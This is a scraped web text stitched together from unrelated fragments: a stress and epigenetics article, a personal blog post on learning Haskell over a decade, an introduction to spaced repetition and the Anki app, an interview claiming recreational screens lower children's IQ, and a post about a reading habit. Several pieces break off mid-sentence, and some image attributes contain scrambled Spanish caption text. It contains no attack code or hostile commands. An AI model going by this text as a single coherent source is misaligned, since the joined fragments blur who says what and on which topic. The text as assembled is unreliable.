<p><span>The experiment also found that these epigenetic changes can be reversed when moms are swapped. A week of nurturing is all it takes for the mother mouse to establish these changes in pup’s epigenomes. Surprisingly these epigenetic changes can be passed down through generations, they found.&nbsp;</span></p>
<p><span>Stress isn’t inherently evil. It has been wired with us since the dawn of our evolution. But if you ever feel like you’re being overpowered by these ruthless pressures of life, set up a strategy to subdue your stress, before it subdues you.</span></p>
<p><span>There are many ways to deal with stress. Of those, the most effective are exercise and meditation. These two inventions have been shown to <a href="https://faseb.onlinelibrary.wiley.com/doi/abs/10.1096/fasebj.2019.33.1_supplement.581.1#:~:text=Studies%20have%20shown%20meditation%20or,tested%20in%20college%E2%80%90aged%20adults." target="_blank" rel="noopener noreferrer">reverse the effect of cortisol</a> on the stressed brain and eventually invigorates the full functionality of the hippocampus, thus improving your memory in the process. <a href="https://sparkonit.com/2016/05/09/looking-trees-helps-reduce-psychological-stress-even-crowded-places/" target="_blank" rel="noopener noreferrer">Spending time in nature</a>, listening to music, and laughing out loud just about have <a href="https://sparkonit.com/2017/05/15/7-simple-tips-reduce-stress-right-now-according-science/" target="_blank" rel="noopener noreferrer">the same effect</a>.&nbsp;</span></p>

      Posted on January 27, 2017
      
          by Kwang Yul Seo
      
  </p>
  

<p>Happy lunar new year! Today I would like to share my experience of learning Haskell. It’s been a really long journey but a really wonderful one.</p>
<!--more-->

<p>Back in 2000, I was an undergraduate student majoring in computer science. At that time, I was into system programming and enjoyed learning low-level implementation details of operating systems and system applications. My primary language was C and programmed all programming assignments in C. I was proud that I understood how my code was compiled and executed on the machine.</p>
<p>One day my friend told me about <em>Haskell</em>. I wasn’t interested in functional programming at that time, but I became curious because he enthusiastically persuaded me to learn Haskell. I ended up reading two books on Haskell.</p>
<ul>
<li><a href="http://www.haskellcraft.com/craft3e/Home.html">Haskell: the Craft of Functional Programming</a></li>
<li><a href="http://www.cs.yale.edu/homes/hudak/SOE/">The Haskell School of Expression</a></li>
</ul>
<p>Both books were really nice and I learned I could program in an entirely different way. However, I wasn’t sure if Haskell could solve the real-world problems I wanted to solve. So my interest in Haskell stopped there.</p>

<p>My first job was mainly about porting and optimizing Java Virtual Machine for embedded systems. My company licensed Sun’s CDC JVM and I was responsible for maintaining it.</p>
<p>It was 2002 and Linux was still a luxury for embedded systems. RTOSes such as pSOS and VxWorks were popular on STBs and I ported JVM to these OSes. These RTOSes didn’t have distinctions between kernel and user space and an application was linked statically with the kernel and ran as a single (kernel) process application on the device.</p>
<p>The implication was profound. I had no safety guarantee provided by modern operating systems. A bug in an application could corrupt the kernel data and crash the entire system. Moreover, because there were dozens of threads competing for shared resources, race conditions and dead locks were a common place. It took hours or even days to find and fix a trivial bug.</p>
<p>The situation was much better when debugging an application written in Java. Thanks to the safety guarantee of Java, certain types of bugs were impossible. A Java program can’t corrupt memory and crash the system. Dead locks are reported systematically by the JVM. It was relatively fun to fix a bug in Java applications.</p>
<p>These experiences motivated me to find systematic ways of preventing bugs and led me to read Benjamin C. Pierce’s <a href="https://www.cis.upenn.edu/~bcpierce/tapl/">Types and Programming Languages</a>. It was the best computer science text book I’ve ever read. I understood why types were important in statically typed functional languages like Haskell! If universities had used this book as a undergraduate PL textbook, many of the confusions and misunderstandings about dynamic vs static typing would have disappeared.</p>

<p>By fully understanding the merits of type systems, I started to learn Haskell in a different perspective. I read <a href="https://www.haskell.org/tutorial/index.html">A Gentle Introduction To Haskell</a> and many tutorials on monads. It wasn’t very hard to understand specific instances of monads such as <em>Reader</em>, <em>Writer</em>, <em>State</em>, <em>List</em> and <em>Maybe</em>. But I couldn’t figure out how they were related. I managed to write simple applications in Haskell, but wasn’t confident that I could use Haskell productively because I couldn’t fully understand one of the core ideas of Haskell.</p>

<p>In the meantime, I changed my career and founded a tech start-up in 2008. I built mobile web browsers for the embedded systems. I created a port of <a href="https://webkit.org/">WebKit</a> and hacked various components of WebKit to speed up the performance. The primary means for optimization was to leverage the multi-core CPU and GPU.</p>
<p>WebKit performs lots of tasks concurrently but it is mostly single-threaded. Loading a page does not benefit much from having a multi-core CPU. So I offloaded some tasks to separate threads but I only gained marginal performance benefits in exchange for largely increased complexity. I learned a lesson that I must pay very high costs of complexity to get small benefits of performance boost. Considering the already complex nature of WebKit, I ended up abandoning most of performance optimizations to keep the complexity under control.</p>
<p>While struggling to squeeze performance out of WebKit, I learned Haskell again to get some insights on parallel programming because Haskell was the only programming language which natively supported <em>STM(Software Transaction Memory)</em>. Simon Marlow’s <a href="http://chimera.labs.oreilly.com/books/1230000000929/index.html">Parallel and Concurrent Programming in Haskell</a> helped me understand how Haskell supported parallel and concurrent programming. Though I learned many valuable lessons from the book, I also felt that the lazy nature of Haskell didn’t go well with parallel programming.</p>

<p>I have spent more than 10 years of my career on embedded systems and increasingly got frustrated with the tools available. So I decided to teach myself Haskell again and use it at work. This time I started to read classic papers on functional programming and Haskell.</p>
<p>Philip Wadler’s <a href="http://homepages.inf.ed.ac.uk/wadler/papers/marktoberdorf/baastad.pdf">Monads for functional programming</a> clicked my mind and I finally became enlightened. The paper is really well written, but I don’t think I could understand <em>Monad</em> just because I read the paper. Years of trials and errors were necessary to understand abstract concepts like monad. It was the most exciting moment of my long journey to Haskell.</p>
<p>Once I understood how I could learn abstractions, the rest was easy. Now I don’t get discouraged just because I don’t understand abstractions at first glance. It takes time and practice to understand abstract things. I also realized that monad was just the beginning. There exist many Haskell idioms that require other abstract concepts such as <em>applicative functor</em>, <em>arrow</em>, <em>profunctor</em> and so on.</p>
<p>Here is the list of papers I found most enlightening when learning Haskell. I also recommend you read any paper with “Functional Pearl” attached to it.</p>
<ul>
<li><a href="http://www.cs.nott.ac.uk/~pszgmh/fold.pdf">A tutorial on the universality and expressiveness of fold</a></li>
<li><a href="http://www.cs.nott.ac.uk/~pszgmh/pearl.pdf">Monadic Parsing in Haskell</a></li>
<li><a href="http://haskell.cs.yale.edu/wp-content/uploads/2011/02/POPL96-Modular-interpreters.pdf">Monad Transformers and Modular Interpreters</a></li>
<li><a href="http://www.cs.ru.nl/~W.Swierstra/Publications/DataTypesALaCarte.pdf">Data types a la carte</a></li>
<li><a href="https://www.cs.ox.ac.uk/jeremy.gibbons/publications/iterator.pdf">The Essence of the Iterator Pattern</a></li>
<li><a href="https://www.st.cs.uni-saarland.de/edu/seminare/2005/advanced-fp/docs/huet-zipper.pdf">The Zipper</a></li>
</ul>

<p>I was confident that Haskell was a good programming language and I was looking for opportunities to use Haskell in production. Bryan O’Sullivan, Don Stewart, and John Goerzen’s <a href="http://book.realworldhaskell.org/">Real World Haskell</a> was a good reference in this direction. It showed how I could use Haskell to do my daily work such as networking, system programming, databases and web programming.</p>
<p>Finally, I started to read real-world Haskell code available on the hackage and realized that the <em>Haskell I know</em> was different from the <em>Haskell that is actually used</em>. Real world Haskell uses lots of GHC extensions which makes me feel it is an entirely different language. A typical Haskell module starts with:</p>
<div><pre><code><span>{-# LANGUAGE CPP                        #-}</span>
<span>{-# LANGUAGE FlexibleContexts           #-}</span>
<span>{-# LANGUAGE ConstraintKinds            #-}</span>
<span>{-# LANGUAGE FlexibleInstances          #-}</span>
<span>{-# LANGUAGE FunctionalDependencies     #-}</span>
<span>{-# LANGUAGE OverloadedStrings          #-}</span>
<span>{-# LANGUAGE QuasiQuotes                #-}</span>
<span>{-# LANGUAGE RecordWildCards            #-}</span>
<span>{-# LANGUAGE TupleSections              #-}</span>
<span>{-# LANGUAGE TypeFamilies               #-}</span>
<span>{-# LANGUAGE RankNTypes                 #-}</span>
<span>{-# LANGUAGE DeriveDataTypeable         #-}</span></code></pre></div>
<p>It seems sticking to Haskell 98 or 2000 does not have much practical sense because many Haskell packages already use many GHC extensions. So I learned them too. <a href="https://ocharles.org.uk/blog/posts/2014-12-01-24-days-of-ghc-extensions.html">24 Days of GHC Extensions</a> was a really great way of learning this topic.</p>
<p>I like the approach of <a href="http://www.yesodweb.com/book/haskell">Yesod Web Framework Book</a> which explains the GHC extensions used in the library before explaining how to use the library. This is often the first step to learn a new library for many Haskell programmers. For example, you can’t use <a href="http://haskell-servant.readthedocs.io/en/stable/">Servant</a> unless you understand <em>DataKinds</em> and <em>TypeOperators</em>. So I encourage Haskell library authors to write more about the GHC extensions they use.</p>
<p>I also found that some packages are essential to use Haskell in practice.</p>
<ul>
<li><code>String</code> type has problems. You need either <a href="https://hackage.haskell.org/package/text">text</a> or <a href="https://hackage.haskell.org/package/bytestring">bytestring</a> for efficient string data processing.</li>
<li>Lazy IO looks nice, but does not work well in practice. To process streaming data properly you need either <a href="https://hackage.haskell.org/package/pipes-4.3.2/docs/Pipes-Tutorial.html">pipes</a> or <a href="https://github.com/snoyberg/conduit#readme">conduit</a>.</li>
<li>You will need a custom monad or monad transformer for your application sooner or later. Either <a href="https://hackage.haskell.org/package/mtl">mtl</a> or <a href="https://hackage.haskell.org/package/transformers">transformers</a> is required.</li>
<li>JSON is a really universal data exchange format these days. <a href="https://hackage.haskell.org/package/aeson-1.1.0.0/docs/Data-Aeson.html">aeson</a> will help you here.</li>
<li><a href="https://hackage.haskell.org/package/QuickCheck">QuickCheck</a> is a bonus you get from using Haskell!</li>
</ul>

<p>I founded a small Haskell shop this year and started to use Haskell in production. I realized that using Haskell in production was, surprisingly, easier than learning Haskell. It took me more than 10 years to learn Haskell, but I felt confident that I could use Haskell in production only after a few months of experiments.</p>
<p>There is one thing I would like to emphasize. Using Haskell does not mean that you must understand all the dependencies you use. Haskell programmers tend to care much about the implementation details of their dependencies because Haskell makes it so easy to understand the meaning of programs with types and equational reasoning. But in my opinion, this is a blessed curse.</p>
<p>That’s not how civilization works. You can drive a car without understanding how engines work. Python or JavaScript programmers do not care about the implementation details of their dependencies because it is simply impossible. Haskell is no exception. Time and money are limited. Please don’t spend too much time on understanding things. Spend more time on building things. Be practical.</p>
<p>Fortunately, some library authors provide a high-level overview of their library. <a href="https://www.andres-loeh.de/Servant/servant-wgp.pdf">Type-level Web APIs with Servant</a> is a great example. It explains the core concepts and the implementation techniques of the library without involving accidental complexities of implementation details. I would love to see more papers like this.</p>

<p><a href="https://www.stackage.org/">Stackage</a> and the <a href="https://docs.haskellstack.org/en/stable/README/">Stack</a> are indispensable tools for using Haskell in production. All the hard work of <a href="https://www.fpcomplete.com/">FP Complete</a> gave me confidence that Haskell was …</p></article></div>

<p>You would have done better in school, for starters. Instead of turning in your bed unable to sleep terrified of the exam coming the next day, you would soundly sleep with the knowledge that you know everything you need to know to ace the exam. And ace it you would indeed.</p>

<p>You would have spent fewer hours studying. How many times have you opened the textbook only to find that you’ve forgotten all that you’d studied the day before? If you did not forget things then those hours you spent studying would always amount to something, instead of leaving you feeling like you’re swimming against the current. School might even have been fun if you did not forget.&nbsp;</p>

<p>What would your career look like if you did not forget?</p>

<p>Forgetfulness affects us all. There is no one that has not grappled with this problem before. Our lives would be better if we did not forget.&nbsp;</p>

<p>Unfortunately, <span>forgetting is inescapable.</span> There is no such thing as a perfect memory. I am not here to sell you on a magic pill that will turn you into Bradley Cooper in the movie Limitless.</p>

<p>However, that doesn’t mean there aren’t things you can do to massively reduce the speed at which you forget things, because there are.&nbsp;</p>

<p>Science has known about what it takes to get memories to stick around in your memory for a long time. It has known about it for a while now, in fact. It’s just that it has done a terrible job so far at making sure that you know about it, you whose life would massively benefit from that knowledge.</p>

<p>My intent for writing this is to correct these wrongs and introduce you to spaced repetition, the more than established method that will put you in control of your memory once and for all, and Anki, the software that will help you do so.&nbsp;</p>

<p>So, let’s start at the beginning: <span> What is spaced repetition?</span></p>

<h2 id="the-centuries-old-science-they-dont-tell-you-about">The Centuries Old Science They Don’t Tell You About</h2>

<p>More than a hundred years ago, the German psychologist Hermann Ebbinghaus not only started the scientific study of memory, but he also made its most impactful discovery.&nbsp;</p>

<p>After all, what discovery could be more impactful than what makes memories stick?</p>

<p>Ebbinghaus created various lists of nonsense syllables that he had to memorize, and once he was able to mouth off the entire list without making a single mistake he would mark on his calendar the day where he had to memorize that list once more.&nbsp;</p>

<p>He would have to memorize some lists the day after, others a week and some a whole month after he had first memorized them. Doesn’t sound much fun, does it? This is especially true when you take into account each list must have taken him quite a long time to memorize since by design each of the three-letter syllables he had to study had been chosen so that they weren’t easily remembered. For example, the syllable BOL was out of the question as Ebbinghaus could instead use BALL to recall it.&nbsp;</p>

<p>After the requisite time had passed, to measure the extent to which he had forgotten the list he’d spent so much time memorizing, he memorized the same list once more. Not only did he have to sit still in his office for a long time trying to memorize a bunch of nonsense words once, he had to do it twice! Throughout his second attempt he did have some help since it would take him less time to memorize the list the second time around if he remembered it from his first foray cramming it into his memory.&nbsp;</p>

<p>If by that point he’d already forgotten it, then it would take him at least as much time to memorize the list the second time as it had the first. However, if some memory of it still lingered in the confines of his mind, he would be able to go through the list faster than before. By varying the amount of time between each attempt, and seeing how that influenced how long it took him then to memorize the list the second time, <span>Ebbinghaus was able to measure the effect time had on his memory.</span></p>

<p>And what an effect it had.&nbsp;</p>

<p>The first thing he noticed was that memories are at their most fragile when they are still young. From the data he’d collected, he could see that the bulk of forgetting happens in the few moments after the memory is created. Rather than forgetting happening at a linear pace over time, each day that passes nicking a constant amount of the vitality of a memory until it is completely forgotten, Ebbinghaus discovered <span>forgetting happens rather rapidly at first but slows down afterward.&nbsp;</span></p>

<p>In the first few hours of its life, it’s as if your newly created memory has jumped out of a flying airplane and is now free-falling through the sky, the wind buffeting its face violently as it quickly loses altitude. As the ground becomes uncomfortably close, our memory activates its parachute and begins to glide, still falling, of course, but much slower than it was when it first jumped out of the plane.&nbsp;
&nbsp;
Now, to be sure, <span>the forgetting curve,</span> as this discovery came to be called, is an important landmark in the scientific study of memory, but it’s not a particularly useful one. We forget things over time; what a discovery! You don’t need to be a top-level scientist to come to that conclusion. It’s why we’re here in the first place!</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b79bb8c6906d331e07905d708043194c5288a3bd/e385a/assets/images/agentleintroductiontoanki/forgettingcurve_alternative.jpg" alt=""></p>
<p> Behold, my superlative drawing skills!</p>
<p>But Ebbinghaus didn’t stop there.
&nbsp;
When he first started learning his lists of nonsense syllables, Ebbinghaus, like many a student, crammed all his studying in a single furious session. But then, possibly because he was fed up with all the cramming, he hit upon the idea of spreading his learning over time. Instead of spending the majority of a day learning one of his lists, he spaced out his learning over a few days. <span>What he found when he did so is the most important discovery about memory that no one ever told you about.</span></p>

<p>You would think not much would change if instead of studying a bunch of material in one day you did so over three or more days. But what Ebbinghaus found was that not only did his memory get stronger, but it also took him less time to memorize his lists. This meant that <span>simply by changing when he studied, Ebbinghaus could have the best of both worlds: a better memory with less time spent studying.&nbsp;</span></p>

<p>It need not be pointed out how important a discovery this is. If someone came up to you and told you about a revolutionary studying method that would not only cut the time you spent studying but also get you to retain the things you learn for longer, you would think you were being sold on some sort of scam.</p>

<p>Yet <span>the spacing effect,</span> as Ebbinghaus’ discovery is called, is far from being a scam. It is <span>one of the most scientifically supported discoveries in the entire field of psychology.</span></p>

<p>The gist of the spacing effect is rather simple. Given the choice between massing all your studying or spacing it out over a period of time, you are better served by spacing it out. <span>There is no catch. It really is that simple.&nbsp;</span></p>

<p>This means if you are a student and you have an exam coming up a month from now, you should start studying now rather than waiting until a single week is left. If, for example, you’re going to spend 50 hours studying, then spreading those hours over the whole month, ensuring that you get re-exposed to the material in sufficiently spaced intervals, would get you much better results than you would if you crammed those 50 hours in a single stress-filled and coffee-fueled week.&nbsp;</p>

<p>Of course, that’s easier said than done.&nbsp;</p>

<p><span>The spacing effect is one of the most important weapons a learner can have on his arsenal</span> but knowing about its amazing effects does not mean that we will necessarily apply it. After all, we all know not to eat too many processed foods do we not? Yet, that doesn’t seem to stop many of us.&nbsp;</p>

<p>Pulling an all-nighter to cram for an exam is like binging on a sugar-filled pastry when one is trying to lose weight, yet the fact it continues to be a staple learning strategy of many a student is a testament to how difficult it can be to embrace the lessons of the spacing effect.&nbsp;</p>

<p>If only there were an app for that…</p>

<h2 id="this-app-will-turn-your-memory-into-a-superpower">This App Will Turn Your Memory Into A Superpower</h2>

<p>One hundred years ago Ebbinghaus didn’t have a computer, let alone a smartphone. If he’d had them they would have taken care of the task of spacing what he had to learn for him. Instead, he had to do all of that himself, though if we consider that he was the kind of guy that did not balk at the idea of spending hundreds of hours learning endless lists of nonsense, perhaps he wasn’t that fazed by it.</p>

<p>Thankfully, today we have tools that manage all of that for us.</p>

<p><span> And it all starts with a simple flashcard.&nbsp;</span></p>

<p>Everyone knows how a flashcard is supposed to work. You write something on the front, then something on the back, and then you’re supposed to recall what it was that you wrote on the back after reading what’s on the front.&nbsp;</p>

<p>Suppose that in the process of studying for a coming exam, you wrote many of these flashcards. You have a big pile of them sitting on your desk and within them are all the things you have to know if you want to ace that exam.&nbsp;</p>

<p>Because you know about the spacing effect, you know that cramming those flashcards is a bad strategy, but then how are you supposed to space them out? There are so many cards to keep track of…</p>

<p><span>What    if those flashcards existed on your computer instead?&nbsp;</span></p>

<p>If that were possible, then the computer could take care of the task of keeping track when you’re supposed to review your flashcards and you could focus solely on the things that matter, which, in this case, is answering your flashcards correctly and acing that exam.&nbsp;</p>

<p>Which is why spaced repetition software was invented: to take care of all the grunt work so you can easily add spaced repetition into your life.</p>

<p>At its core, all spaced repetition software does is keep track of when to present you with the material that you put in it. It’s called spaced repetition software because they use special algorithms to calculate the optimal interval between when you last reviewed the material and …</p></div></section></div></div>

<p>Several studies have shown that when the use of television or video games increases, IQ and cognitive development decrease.</p>
<p>The main foundations of our intelligence are affected: language, concentration, memory, culture (defined as a body of knowledge that helps us organize and understand the world).</p>
<p>Ultimately, these impacts lead to a significant drop in academic performance.</p>
<p><strong>And why does the use of digital devices cause all that? </strong></p>
<p>The causes are also clearly identified: decrease in the quality and quantity of intrafamily interactions, which are fundamental for the development of language and emotional development; decrease in time devoted to other more enriching activities (homework, music, art, reading, etc.); sleep disruption, which is quantitatively shortened and qualitatively degraded; overstimulation of attention, leading to disorders of concentration, learning and impulsivity; Intellectual under-stimulation, which prevents the brain from unfolding its full potential; and an excessive sedentary lifestyle that, in addition to bodily development, influences brain maturation.</p>
<p><strong>What exactly damage do screens do to the neurological system? </strong></p>
<p>The brain is not a ‘stable’ organ. Its ‘final’ characteristics depend on experience.</p>
<p>The world in which we live, the challenges we face, modify both the structure and its functioning, and some regions of the brain specialize, some networks are created and strengthened, others are lost, some become thicker and others thinner.</p>

</figcaption></figure>
<p>Time spent in front of a screen for recreational reasons has been observed to delay anatomical and functional maturation of the brain within various cognitive networks related to language and attention.</p>
<p>It must be emphasized that not all activities feed the construction of the brain with the same efficiency.</p>
<p><strong>What does it mean? </strong></p>
<p>Activities related to school, intellectual work, reading, music, art, sports, etc. they have a much greater structuring and nourishing power to the brain than recreational screens.</p>
<p>But nothing lasts forever. The potential for brain plasticity is extreme during childhood and adolescence. Afterwards, it begins to fade. It doesn’t go away, but it becomes much less efficient.</p>
<p><img data-src="https://thestateindia.com/wp-content/uploads/2020/09/Why-Mexico-is-one-of-the-countries-with-the-most.gif" alt="" cuando="" se="" pone="" una="" pantalla="" en="" manos="" de="" un="" niño="" o="" adolescente,="" casi="" siempre="" prevalecen="" los="" usos="" recreativos="" más="" empobrecedores"",="" source:="" ,="" source="" description:="" image:="" "="" data-lazy-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970619_593_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970619_593_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png"></p>

<p>The brain can be compared to a plasticine. At first, it is wet and easy to sculpt. But over time it becomes drier and much more difficult to mold.</p>
<p>The problem with recreational screens is that they alter the development of our children’s brain and impoverish it.</p>
<p><strong>Are all screens equally harmful? </strong></p>
<p>Nobody says that the “digital revolution” is bad and should be stopped. I myself spend a good part of my working day with digital tools. And when my daughter entered elementary school, I started teaching her how to use some office software and looking for information on the internet.</p>
<p>Should students be taught fundamental computer skills and tools? Clear. Likewise, can digital technology be a relevant tool in the pedagogical arsenal of teachers? Of course, if it is part of a structured educational project and if the use of a certain software effectively promotes transmission.</p>
<p>However, when a screen is placed in the hands of a child or adolescent, the most impoverishing recreational uses almost always prevail.</p>
<p>This includes, in order of importance: television, which remains the number one screen of all ages (movies, series, clips, etc.); then video games (mainly action and violent), and finally, around adolescence, a frenzy of useless self-exposure on social media.</p>
<p><strong>How much time do children and young people usually spend in front of screens? </strong></p>
<p>On average, nearly three hours a day for 2-year-olds, about five hours for 8-year-olds, and more than seven hours for teens.</p>
<figure>
<figure id=""><img loading="lazy" data-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_55_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.jpg" alt="baby using screen" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_55_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.jpg"><figcaption>A 2-year-old child spends almost three hours a day in front of screens. on average.

</figcaption></figure>
<p>This means that before reaching 18 years of age, our children will have spent the equivalent of 30 school years in front of recreational screens or, if you prefer, 16 years of full-time work!
</p>
<p>It is simply insane and irresponsible.</p>
<p><strong>How much time should children spend on recreational screens? </strong></p>
<p>Involving children is important.</p>
<p>They need to be told that recreational screens damage the brain, impair sleep, interfere with language acquisition, weaken academic performance, impair concentration, increase the risk of obesity, etc.</p>
<p>Some studies have shown that it is easier for children and adolescents to follow the rules about screens when their reason for being is explained and discussed with them.</p>
<p><img data-src="https://thestateindia.com/wp-content/uploads/2020/09/Why-Mexico-is-one-of-the-countries-with-the-most.gif" alt="" involucrar="" a="" los="" niños="" es="" importante.="" necesitan="" que="" se="" les="" diga="" las="" pantallas="" recreativas="" dañan="" el="" cerebro,="" perjudican="" sueño,="" interfieren="" con="" la="" adquisición="" del="" lenguaje"",="" source:="" ,="" source="" description:="" image:="" "="" data-lazy-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_943_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_943_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png"></p>

<p>From there, the general idea is simple: at any age, the least is the best.</p>
<p>Beyond this general rule, more specific guidelines can be provided based on the child’s age. Before the age of 6, the ideal is not to have screens (which does not mean that from time to time you cannot watch cartoons with your children).</p>
<p>The earlier they are exposed, the greater the negative impacts and the risk of subsequent excessive consumption.</p>
<p>From 6 years of age, if the contents are adapted and sleep is maintained, it can go up to half an hour a day, even an hour, without an appreciable negative influence.</p>
<p>Other relevant rules: no screens in the morning before going to school, nothing at night before going to bed or when with other people. And, above all, no screens in the bedroom.</p>
<p>But it’s hard to tell our kids that screens are a problem when we, as parents, are constantly connected to our smartphones or game consoles.</p>
<p><img data-src="https://thestateindia.com/wp-content/uploads/2020/09/Why-Mexico-is-one-of-the-countries-with-the-most.gif" alt="" reglas="" relevantes:="" nada="" de="" pantallas="" por="" la="" mañana="" antes="" ir="" a="" escuela,="" noche="" irse="" cama...="" ¡sobre="" todo!="" en="" el="" dormitorio"",="" source:="" ,="" source="" description:="" image:="" "="" data-lazy-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_123_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_123_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png"></p>

<p><strong>Why are many parents unaware of the dangers of screens? </strong></p>
<p>Because the information given to parents is partial and biased. The mainstream media is rife with unsubstantiated claims, misleading propaganda, and inaccurate information. The discrepancy between media content and scientific reality is often disturbing, if not infuriating.</p>
<p>I don’t mean to say that the media is dishonest: separating the wheat from the chaff is not easy, even for honest and conscientious journalists.</p>
<p>But not surprising. The digital industry generates billions of dollars in profits each year. And, obviously, children and adolescents are a very lucrative resource.</p>
<p>And for companies worth billions of dollars, it is easy to find complacent scientists, dedicated lobbyists and enthusiastic traders of doubts.</p>
<p>Let me give you an example.</p>

<figure id=""><img loading="lazy" data-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_781_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.jpg" alt="boy playing video games" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970620_781_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.jpg"><figcaption>Digital companies hire experts to explain how smart gamers are and how good it is to play video games.

</figcaption></figure>
<p>Recently a psychologist, supposedly an expert in video games, explained in various media that these games had positive effects, that they should not be demonized, that not playing could even be a handicap for the future of a child, that the most violent games could have therapeutic actions and be able to quench anger in players, etc.</p>
<p>The problem is that none of the journalists who interviewed this “expert” mentioned that he worked for the video game industry. And this is just one example among the many that are described in my book.</p>
<p>This is not something new: it happened in the past with tobacco, global warming, pesticides, sugar, etc.</p>
<p>But I think there is room for hope. Over time, reality becomes increasingly difficult to deny.</p>
<p><img data-src="https://thestateindia.com/wp-content/uploads/2020/09/Why-Mexico-is-one-of-the-countries-with-the-most.gif" alt="" en="" una="" investigación="" se="" entregaron="" consolas="" de="" juegos="" a="" niños="" que="" iban="" bien="" la="" escuela.="" después="" 4="" meses,="" descubrió="" pasaban="" más="" tiempo="" jugando="" y="" menos="" haciendo="" tareas"",="" source:="" ,="" source="" description:="" image:="" "="" data-lazy-src="https://thestateindia.com/wp-content/uploads/2020/10/1603970621_226_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png" src="https://thestateindia.com/wp-content/uploads/2020/10/1603970621_226_Digital-Natives-Children-with-Lower-IQs-Than-Their-Parents.png"></p>

<p><strong>There are studies that affirm, for example, that video games help to obtain better academic results … </strong></p>
<p>Let me put it frankly: that’s sheer nonsense.</p>
<p>That idea is a true masterpiece of propaganda. It is mainly based on a few isolated studies with rotten data, which are published in secondary journals and are often contradicted.</p>
<p>In an interesting experimental investigation, game consoles were given to children who were doing well in school. After four months, they were found to spend more time playing games and less time doing homework. Their grades dropped about 5% (which is a lot in just four months!).</p>
<p>In another study, children had to learn a list of words. An hour later, some were allowed to play a car racing video game. Two hours later they went to bed.</p>

</figure>
<p>The next morning, the children who did not play recalled about 80% of the lesson compared to 50% of the players.
</p>
<p>The authors found that playing interfered with sleep and memorization.</p>
<p><strong>How </strong><strong>believe to be</strong><strong>members of</strong><strong> this digital generation </strong><strong>when </strong><strong>become adults? </strong></p>
<p>I often hear that digital natives know “differently.” The idea is that although they show linguistic, attention and knowledge deficits, they are very good at “other things”.</p>
<p>The question lies in the definition of those “other things”.</p>
<p>Various studies indicate that, in contrast to common beliefs, they are not very good with computers.</p>
<p>A report from the European Union even explains that their low digital competence hinders the adoption of educational technologies in schools.</p>
<p>Other studies also indicate that they are not very efficient at processing and understanding the vast amount of information available on the internet.</p>

<p><em>I was a naive kid. When I was younger, whenever I came across books like <a href="https://durmonski.com/book-summaries/rich-dad-poor-dad/" target="_blank" aria-label="Rich Dad Poor Dad (opens in a new tab)" rel="noreferrer noopener">Rich Dad Poor Dad</a>, I thought that by just reading what’s written inside I will magically become a millionaire. Or, by studying the lessons presented in <a href="https://durmonski.com/book-summaries/the-7-habits-of-highly-effective-people/" target="_blank" aria-label="The 7 Habits of Highly Effective People (opens in a new tab)" rel="noreferrer noopener">The 7 Habits of Highly Effective People</a>, I will transform into a successful business owner who is not holding any sabotaging habits. After all, these books always came with a step-by-step framework that I diligently followed. And while didn’t come close to becoming an ultra-rich entrepreneur, like these titles promised, how my life turned out eventually, which is not bad at all, is thanks to my reading habit.</em></p>



<p>I actually used to despise reading. My parents were constantly shoving books in my face and forcing me to read literature that didn’t even interest me closely. </p>



<p>The books I had to read according to my folks during my teenage years were either part of my school curriculum or titles that were famous years ago. Of course, like every self-respecting teenager trying to look cool, I rebelled against these rules and did the only thing I could – I stopped reading altogether.</p>



<p>Somewhere deep down though, I knew that reading was good, but spending my time studying historical novels related to my country, or fact-heavy encyclopedia-like hardcovers didn’t seem practical to me.</p>



<p>Probably it’s because I grew up playing video games, or because my brother and I collected choose-your-own-adventure type of books when we were younger. But I always assumed that I should get some sort of outcome when I was reading a book. A book should help me learn a skill, conquer a territory, slave a dragon, and in way level up.</p>



<p>Sadly, this wasn’t the case with the novels that the school system imposed on me. These books were only throwing isolated facts that were not related to my existence here and now. That’s why I was careless about literature when I was a teenager.</p>



<p>Fortunately, later in my life, I re-evaluate my relationship with the libraries.</p>



<p>Things changed when I found out about the existence of the applied psychology category. At least that’s how the libraries of my country label the self-help genre. I was thrilled. Books that can help you master a skill? It sounded magical. </p>



<p>That’s when I found titles like <a href="https://durmonski.com/book-summaries/think-and-grow-rich/" target="_blank" aria-label="Think and Grow Rich (opens in a new tab)" rel="noreferrer noopener">Think and Grow Rich</a>, <a href="https://durmonski.com/book-summaries/influence/" target="_blank" aria-label="Influence (opens in a new tab)" rel="noreferrer noopener">Influence</a>, <a href="https://durmonski.com/book-summaries/outwitting-the-devil/" target="_blank" aria-label="Outwitting the Devil (opens in a new tab)" rel="noreferrer noopener">Outwitting the Devil</a>, and similar mind-transforming hardcovers. To me, these books looked like volumes full of spells – filled with practical advice that can change your life when you apply them.</p>



<p>That’s when my reading journey began. </p>



<p>To this date, I’ve probably read more than 150 books. 100 of these titles are carefully categorized and summarized <a href="https://durmonski.com/category/book-summaries/" target="_blank" aria-label="here (opens in a new tab)" rel="noreferrer noopener">here</a> on my site.</p>



<p>I learned a lot from these books in terms of skills and know-how. But I also learned something that I believe is more valuable – how to approach reading. </p>



<p>When I first started reading, I picked the books that were in front of me – sort to speak. I always grabbed the most talked-about books, thinking, that they hold all the answers in the world.</p>



